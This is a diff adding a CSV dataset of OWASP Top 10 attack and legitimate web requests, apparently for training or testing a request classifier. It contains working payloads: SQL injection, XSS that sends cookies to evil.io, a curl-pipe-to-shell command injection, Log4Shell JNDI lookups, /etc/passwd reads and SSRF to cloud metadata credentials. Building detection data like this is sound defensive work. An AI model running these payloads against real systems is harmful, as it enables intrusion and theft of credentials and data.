@@ -1,0 +1,98 @@
+id,owasp_id,owasp_category,attack_type,payload,target_param,endpoint_example,http_method,legitimate,attack,severity,description
+1,A01:2021,Broken Access Control,IDOR / Forced Browsing / Path Traversal,/api/users/1245/invoice,url_path,/api/users/{id}/invoice,GET,False,True,high,IDOR - accessing another user's invoice by incrementing ID
+2,A01:2021,Broken Access Control,IDOR / Forced Browsing / Path Traversal,/api/admin/dashboard,url_path,/api/users/{id}/invoice,GET,False,True,high,Forced browsing to admin panel without authorization
+3,A01:2021,Broken Access Control,IDOR / Forced Browsing / Path Traversal,../../../../etc/passwd,file,/api/users/{id}/invoice,GET,False,True,high,Path traversal to read system password file
+4,A01:2021,Broken Access Control,IDOR / Forced Browsing / Path Traversal,..%2f..%2f..%2fetc%2fpasswd,file,/api/users/{id}/invoice,GET,False,True,high,URL-encoded path traversal bypass attempt
+5,A01:2021,Broken Access Control,IDOR / Forced Browsing / Path Traversal,role=admin,body_param,/api/users/{id}/invoice,GET,False,True,high,Parameter tampering - privilege escalation via role field
+6,A01:2021,Broken Access Control,IDOR / Forced Browsing / Path Traversal,user_id=2001&user_id=1,body_param,/api/users/{id}/invoice,GET,False,True,high,HTTP parameter pollution to bypass ownership check
+7,A01:2021,Broken Access Control,IDOR / Forced Browsing / Path Traversal,/api/orders/export?user=*,query_param,/api/users/{id}/invoice,GET,False,True,high,Wildcard/mass IDOR attempting to export all orders
+8,A01:2021,Broken Access Control,IDOR / Forced Browsing / Path Traversal,Cookie: isAdmin=true,cookie,/api/users/{id}/invoice,GET,False,True,high,Client-side trust - forged admin cookie flag
+9,A01:2021,Broken Access Control,IDOR / Forced Browsing / Path Traversal,/api/users/1245/invoice?debug=1&bypass_auth=1,query_param,/api/users/{id}/invoice,GET,False,True,high,Attempt to use debug flag to bypass authorization
+10,A01:2021,Broken Access Control,IDOR / Forced Browsing / Path Traversal,X-Original-URL: /admin/delete-user,header,/api/users/{id}/invoice,GET,False,True,high,Header-based access-control bypass via reverse-proxy routing
+11,A01:2021,Broken Access Control,Legitimate Access,/api/users/9f3b1c/invoice,url_path,/api/users/{id}/invoice,GET,True,False,none,User requesting their own invoice by their own user id
+12,A01:2021,Broken Access Control,Legitimate Access,/api/dashboard,url_path,/api/users/{id}/invoice,GET,True,False,none,Authenticated user accessing their own dashboard
+13,A01:2021,Broken Access Control,Legitimate Access,/api/orders/5521,url_path,/api/users/{id}/invoice,GET,True,False,none,User viewing their own order
+14,A02:2021,Cryptographic Failures,Sensitive Data Exposure / Weak Crypto,http://suraksha.local/login?password=P@ssw0rd123,query_param,/api/login,POST,False,True,critical,Credentials sent in cleartext over HTTP / in URL
+15,A02:2021,Cryptographic Failures,Sensitive Data Exposure / Weak Crypto,Authorization: Basic YWRtaW46cGFzc3dvcmQxMjM=,header,/api/login,POST,False,True,critical,Weak Basic Auth with easily decodable base64 credentials
+16,A02:2021,Cryptographic Failures,Sensitive Data Exposure / Weak Crypto,/api/reset-password?token=000001,query_param,/api/login,POST,False,True,critical,Predictable/sequential password reset token
+17,A02:2021,Cryptographic Failures,Sensitive Data Exposure / Weak Crypto,ssn=432-11-9087&store_plain=true,body_param,/api/login,POST,False,True,critical,Request to store sensitive PII without encryption flag
+18,A02:2021,Cryptographic Failures,Sensitive Data Exposure / Weak Crypto,cipher=DES&key_length=56,body_param,/api/login,POST,False,True,critical,Downgrade request to weak legacy cipher (DES)
+19,A02:2021,Cryptographic Failures,Sensitive Data Exposure / Weak Crypto,/api/export?field=credit_card_number&mask=false,query_param,/api/login,POST,False,True,critical,Request for unmasked PAN/credit-card data export
+20,A02:2021,Cryptographic Failures,Legitimate Secure Request,https://suraksha.local/login,url,/api/login,POST,True,False,none,Login performed over TLS as expected
+21,A02:2021,Cryptographic Failures,Legitimate Secure Request,/api/export?field=last4_only&mask=true,query_param,/api/login,POST,True,False,none,Export request correctly requesting masked card data
+22,A03:2021,Injection,Boolean-Based SQLi,' OR 1=1 --,username/login_field,/api/login,POST,False,True,critical,Boolean-Based SQLi payload targeting authentication endpoint
+23,A03:2021,Injection,Boolean-Based SQLi,admin' OR '1'='1,username/login_field,/api/login,POST,False,True,critical,Boolean-Based SQLi payload targeting authentication endpoint
+24,A03:2021,Injection,Union-Based SQLi,"' UNION SELECT username, password FROM users --",username/login_field,/api/login,POST,False,True,critical,Union-Based SQLi payload targeting authentication endpoint
+25,A03:2021,Injection,Error-Based SQLi,"1' AND 1=CONVERT(int,(SELECT @@version)) --",username/login_field,/api/login,POST,False,True,critical,Error-Based SQLi payload targeting authentication endpoint
+26,A03:2021,Injection,Time-Based Blind SQLi,'; WAITFOR DELAY '0:0:5' --,username/login_field,/api/login,POST,False,True,critical,Time-Based Blind SQLi payload targeting authentication endpoint
+27,A03:2021,Injection,Stacked Queries SQLi,1; DROP TABLE users; --,username/login_field,/api/login,POST,False,True,critical,Stacked Queries SQLi payload targeting authentication endpoint
+28,A03:2021,Injection,Obfuscated SQLi,"/**/UN/**/ION/**/SEL/**/ECT/**/1,2,3--",username/login_field,/api/login,POST,False,True,critical,Obfuscated SQLi payload targeting authentication endpoint
+29,A03:2021,Injection,Time-Based Blind SQLi,' OR SLEEP(5) AND '1'='1,username/login_field,/api/login,POST,False,True,critical,Time-Based Blind SQLi payload targeting authentication endpoint
+30,A03:2021,Injection,Polyglot SQLi,1' OR '1'='1' /*,username/login_field,/api/login,POST,False,True,critical,Polyglot SQLi payload targeting authentication endpoint
+31,A03:2021,Injection,SQLi to OS Command Execution,' ; EXEC xp_cmdshell('whoami') --,username/login_field,/api/login,POST,False,True,critical,SQLi to OS Command Execution payload targeting authentication endpoint
+32,A03:2021,Injection,Reflected XSS,<script>alert(document.cookie)</script>,comment_field,/api/reports/comment,POST,False,True,high,Reflected XSS payload injected into user-generated content field
+33,A03:2021,Injection,Stored XSS via image tag,<img src=x onerror=alert('xss')>,comment_field,/api/reports/comment,POST,False,True,high,Stored XSS via image tag payload injected into user-generated content field
+34,A03:2021,Injection,XSS via SVG onload event,<svg/onload=alert(1)>,comment_field,/api/reports/comment,POST,False,True,high,XSS via SVG onload event payload injected into user-generated content field
+35,A03:2021,Injection,XSS via javascript: URI,javascript:alert(document.domain),comment_field,/api/reports/comment,POST,False,True,high,XSS via javascript: URI payload injected into user-generated content field
+36,A03:2021,Injection,XSS session-cookie exfiltration,"""><script>fetch('//evil.io/'+document.cookie)</script>",comment_field,/api/reports/comment,POST,False,True,high,XSS session-cookie exfiltration payload injected into user-generated content field
+37,A03:2021,Injection,OS Command Injection,127.0.0.1; cat /etc/passwd,ping_host,/api/diagnostics/ping,POST,False,True,critical,OS Command Injection payload in network diagnostics field
+38,A03:2021,Injection,OS Command Injection,127.0.0.1 && whoami,ping_host,/api/diagnostics/ping,POST,False,True,critical,OS Command Injection payload in network diagnostics field
+39,A03:2021,Injection,Command Substitution Injection,$(curl http://evil.io/shell.sh | sh),ping_host,/api/diagnostics/ping,POST,False,True,critical,Command Substitution Injection payload in network diagnostics field
+40,A03:2021,Injection,Backtick Command Injection,`id`,ping_host,/api/diagnostics/ping,POST,False,True,critical,Backtick Command Injection payload in network diagnostics field
+41,A03:2021,Injection,LDAP Injection,*)(uid=*))(|(uid=*,query,/api/directory/search,POST,False,True,high,LDAP Injection payload
+42,A03:2021,Injection,NoSQL Injection (MongoDB),"{""$where"": ""this.password.length > 0""}",filter,/api/users/find,POST,False,True,high,NoSQL Injection (MongoDB) payload
+43,A03:2021,Injection,XXE Injection,"<!DOCTYPE foo [<!ENTITY xxe SYSTEM ""file:///etc/passwd"">]><foo>&xxe;</foo>",body,/api/import/xml,POST,False,True,high,XXE Injection payload
+44,A03:2021,Injection,Server-Side Template Injection (SSTI),{{7*7}},template_input,/api/render/template,POST,False,True,high,Server-Side Template Injection (SSTI) payload
+45,A03:2021,Injection,SSTI (OGNL/Java EL),${7*7},template_input,/api/render/template,POST,False,True,high,SSTI (OGNL/Java EL) payload
+46,A03:2021,Injection,CRLF / HTTP Header Injection,%0d%0aSet-Cookie:%20session=attacker,next_url,/api/redirect,POST,False,True,high,CRLF / HTTP Header Injection payload
+47,A03:2021,Injection,Legitimate Input,john.doe@example.com,username,/api/login,POST,True,False,none,Legitimate email used as login username
+48,A03:2021,Injection,Legitimate Input,"Great product, fast delivery!",comment_field,/api/login,POST,True,False,none,Legitimate user review comment
+49,A03:2021,Injection,Legitimate Input,8.8.8.8,ping_host,/api/login,POST,True,False,none,Legitimate public IP submitted for ping diagnostics
+50,A04:2021,Insecure Design,Business Logic Abuse,quantity=-5,body_param,/api/cart/checkout,POST,False,True,medium,Negative quantity abuse to generate refund/credit
+51,A04:2021,Insecure Design,Business Logic Abuse,price=0.01,body_param,/api/cart/checkout,POST,False,True,medium,Client-side price tampering on checkout
+52,A04:2021,Insecure Design,Business Logic Abuse,coupon=SAVE100&apply_count=999,body_param,/api/cart/checkout,POST,False,True,medium,Coupon code reused beyond intended business limit
+53,A04:2021,Insecure Design,Business Logic Abuse,otp_attempts=unlimited,body_param,/api/cart/checkout,POST,False,True,medium,Attempt to disable OTP attempt-rate business rule
+54,A04:2021,Insecure Design,Business Logic Abuse,transfer_amount=999999999&currency=USD,body_param,/api/cart/checkout,POST,False,True,medium,Unrealistic transaction amount bypassing sanity checks
+55,A04:2021,Insecure Design,Business Logic Abuse,/api/password-reset (120 requests/min from 1 IP),rate,/api/cart/checkout,POST,False,True,medium,Missing rate limiting enabling reset-token brute force
+56,A04:2021,Insecure Design,Legitimate Business Flow,quantity=2,body_param,/api/cart/checkout,POST,True,False,none,Normal quantity for a legitimate purchase
+57,A04:2021,Insecure Design,Legitimate Business Flow,coupon=WELCOME10,body_param,/api/cart/checkout,POST,True,False,none,Single legitimate coupon application
+58,A05:2021,Security Misconfiguration,Misconfiguration Probe,/.env,url_path,/,GET,False,True,medium,Probe for exposed environment/config file
+59,A05:2021,Security Misconfiguration,Misconfiguration Probe,/.git/config,url_path,/,GET,False,True,medium,Probe for exposed .git directory
+60,A05:2021,Security Misconfiguration,Misconfiguration Probe,/actuator/health,url_path,/,GET,False,True,medium,Probe for exposed Spring Boot actuator endpoint
+61,A05:2021,Security Misconfiguration,Misconfiguration Probe,/wp-config.php.bak,url_path,/,GET,False,True,medium,Probe for exposed backup config file
+62,A05:2021,Security Misconfiguration,Misconfiguration Probe,/?debug=true&trace=1,query_param,/,GET,False,True,medium,Attempt to trigger verbose stack-trace error disclosure
+63,A05:2021,Security Misconfiguration,Misconfiguration Probe,/api/admin/ (default creds admin:admin),credentials,/,GET,False,True,medium,Login attempt using default admin credentials
+64,A05:2021,Security Misconfiguration,Misconfiguration Probe,/server-status,url_path,/,GET,False,True,medium,Probe for exposed Apache server-status page
+65,A05:2021,Security Misconfiguration,Legitimate Request,/favicon.ico,url_path,/,GET,True,False,none,Legitimate static asset request
+66,A05:2021,Security Misconfiguration,Legitimate Request,/api/health,url_path,/,GET,True,False,none,Legitimate health-check request from monitoring system
+67,A06:2021,Vulnerable and Outdated Components,Known-CVE Component Exploitation Probe,${jndi:ldap://evil.io/a},header/User-Agent,/,GET,False,True,critical,Log4Shell (CVE-2021-44228) JNDI lookup injection
+68,A06:2021,Vulnerable and Outdated Components,Known-CVE Component Exploitation Probe,Content-Type: ${struts.valueStack},header,/,GET,False,True,critical,Apache Struts OGNL injection probe (CVE-2017-5638 style)
+69,A06:2021,Vulnerable and Outdated Components,Known-CVE Component Exploitation Probe,/struts2-showcase/,url_path,/,GET,False,True,critical,Probing for outdated vulnerable Struts2 demo app
+70,A06:2021,Vulnerable and Outdated Components,Known-CVE Component Exploitation Probe,X-Forwarded-For: ${jndi:rmi://evil.io/x},header,/,GET,False,True,critical,Log4Shell payload delivered via X-Forwarded-For header
+71,A06:2021,Vulnerable and Outdated Components,Known-CVE Component Exploitation Probe,/solr/admin/cores?action=CREATE,url_path,/,GET,False,True,critical,Probe for known Apache Solr RCE misconfiguration
+72,A06:2021,Vulnerable and Outdated Components,Legitimate Request,Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/127.0,header/User-Agent,/,GET,True,False,none,Normal browser User-Agent string
+73,A07:2021,Identification and Authentication Failures,Auth Failure Exploitation,admin:123456,credentials,/api/login,POST,False,True,high,Credential-stuffing attempt using leaked/common password
+74,A07:2021,Identification and Authentication Failures,Auth Failure Exploitation,admin:password,credentials,/api/login,POST,False,True,high,Credential-stuffing attempt using default password
+75,A07:2021,Identification and Authentication Failures,Auth Failure Exploitation,300 login attempts in 60s from single IP,rate,/api/login,POST,False,True,high,Brute-force login attack pattern
+76,A07:2021,Identification and Authentication Failures,Auth Failure Exploitation,JSESSIONID=FIXEDSESSION123 (set before login),cookie,/api/login,POST,False,True,high,Session-fixation attempt - pre-set session ID
+77,A07:2021,Identification and Authentication Failures,Auth Failure Exploitation,/api/login?mfa_bypass=true,query_param,/api/login,POST,False,True,high,Attempt to bypass multi-factor authentication step
+78,A07:2021,Identification and Authentication Failures,Auth Failure Exploitation,password=123456&confirm_password=123456,body_param,/api/login,POST,False,True,high,Weak password accepted during registration (policy test)
+79,A07:2021,Identification and Authentication Failures,Legitimate Login,elena@antigravity.io:securePassword2026!,credentials,/api/login,POST,True,False,none,Legitimate login with strong unique password
+80,A08:2021,Software and Data Integrity Failures,Integrity Failure Exploitation,rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==,body_param,/api/data/deserialize,POST,False,True,critical,Base64-encoded malicious Java serialized object (insecure deserialization)
+81,A08:2021,Software and Data Integrity Failures,Integrity Failure Exploitation,"{""alg"":""none"",""typ"":""JWT""} ...unsigned",header/Authorization,/api/data/deserialize,POST,False,True,critical,JWT 'alg:none' signature-bypass attempt
+82,A08:2021,Software and Data Integrity Failures,Integrity Failure Exploitation,pickle.loads(untrusted_bytes),body_param,/api/data/deserialize,POST,False,True,critical,Python pickle deserialization of untrusted data
+83,A08:2021,Software and Data Integrity Failures,Integrity Failure Exploitation,/api/update?source=http://evil.io/malicious_update.pkg&verify_signature=false,query_param,/api/data/deserialize,POST,False,True,critical,"Auto-update pipeline tampering, signature check disabled"
+84,A08:2021,Software and Data Integrity Failures,Integrity Failure Exploitation,npm install left-pad@malicious-fork,dependency,/api/data/deserialize,POST,False,True,critical,Supply-chain attack via tampered/typosquatted dependency
+85,A08:2021,Software and Data Integrity Failures,Legitimate Integrity-Checked Request,"{""alg"":""HS256"",""typ"":""JWT""} ...signed",header/Authorization,/api/data/deserialize,POST,True,False,none,Properly signed JWT presented for authentication
+86,A09:2021,Security Logging and Monitoring Failures,Logging/Monitoring Evasion or Abuse,username=admin%0aINFO: Login successful for admin,body_param,/api/login,POST,False,True,medium,Log injection/forging via CRLF to fake a success log line
+87,A09:2021,Security Logging and Monitoring Failures,Logging/Monitoring Evasion or Abuse,User-Agent: sqlmap/1.7.11#stable (http://sqlmap.org),header,/api/login,POST,False,True,medium,Automated scanner signature that should trigger an alert
+88,A09:2021,Security Logging and Monitoring Failures,Logging/Monitoring Evasion or Abuse,DELETE FROM audit_logs WHERE 1=1,body_param,/api/login,POST,False,True,medium,Attempt to tamper with / clear audit log table
+89,A09:2021,Security Logging and Monitoring Failures,Logging/Monitoring Evasion or Abuse,X-Request-Id: ' OR '1'='1,header,/api/login,POST,False,True,medium,Injection attempt via a field that is logged but rarely sanitized
+90,A09:2021,Security Logging and Monitoring Failures,Legitimate Loggable Request,username=john.doe,body_param,/api/login,POST,True,False,none,Legitimate username that will be logged normally
+91,A10:2021,Server-Side Request Forgery (SSRF),SSRF Exploitation,http://169.254.169.254/latest/meta-data/iam/security-credentials/,url_param,/api/webhook/fetch-preview,POST,False,True,critical,SSRF to cloud metadata endpoint to steal IAM credentials
+92,A10:2021,Server-Side Request Forgery (SSRF),SSRF Exploitation,http://127.0.0.1:6379/,url_param,/api/webhook/fetch-preview,POST,False,True,critical,SSRF probing internal Redis service
+93,A10:2021,Server-Side Request Forgery (SSRF),SSRF Exploitation,file:///etc/passwd,url_param,/api/webhook/fetch-preview,POST,False,True,critical,SSRF using file:// scheme to read local files
+94,A10:2021,Server-Side Request Forgery (SSRF),SSRF Exploitation,gopher://127.0.0.1:25/xHELO%20evil,url_param,/api/webhook/fetch-preview,POST,False,True,critical,SSRF via gopher protocol to interact with internal SMTP
+95,A10:2021,Server-Side Request Forgery (SSRF),SSRF Exploitation,http://internal-admin.local:8080/delete-all,url_param,/api/webhook/fetch-preview,POST,False,True,critical,SSRF targeting internal-only admin endpoint
+96,A10:2021,Server-Side Request Forgery (SSRF),SSRF Exploitation,http://[::1]:80/,url_param,/api/webhook/fetch-preview,POST,False,True,critical,SSRF using IPv6 loopback to bypass naive IP filters
+97,A10:2021,Server-Side Request Forgery (SSRF),Legitimate External Fetch,https://images.unsplash.com/photo-123.jpg,url_param,/api/webhook/fetch-preview,POST,True,False,none,Legitimate external image URL for preview fetch
